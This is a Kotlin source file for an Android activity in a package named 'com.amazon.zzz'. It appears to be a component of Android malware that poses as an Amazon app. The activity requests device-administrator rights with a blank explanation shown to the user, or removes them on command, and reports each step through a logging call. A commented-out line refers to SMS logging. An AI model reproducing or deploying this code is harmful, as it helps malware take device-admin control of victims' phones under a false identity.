package com.amazon.zzz.Admin

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import com.amazon.zzz.ApiNm.apiUt


class admActivityAdmin : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        apiUt.sendLogs(this@admActivityAdmin, "", "admActivityAdmin onCreate", "log")
        try {
            val componentName = ComponentName(this.packageName, admReceiverDeviceAdmin::class.java.name)
            if (intent.getStringExtra("admin") == "1") {
                val activateDeviceAdmin = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                activateDeviceAdmin.putExtra(
                    DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    componentName
                )
                activateDeviceAdmin.putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    ""
                )
                apiUt.sendLogs(this@admActivityAdmin, "", "admActivityAdmin activateDeviceAdmin", "log")
                startActivityForResult(activateDeviceAdmin, 100)
            } else {
                val mAdminReceiver = ComponentName(this, admReceiverDeviceAdmin::class.java)
                val devicePolicyManager =
                    getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                apiUt.sendLogs(this@admActivityAdmin, "", "admActivityAdmin removeActiveAdmin", "log")
                devicePolicyManager.removeActiveAdmin(mAdminReceiver)
            }
        } catch (ex: Exception) {
            //   utils.SettingsToAdd(this, constants.LogSMS , constants.string_148 + ex.toString() + constants.string_119);
        }
        finish()
    }

}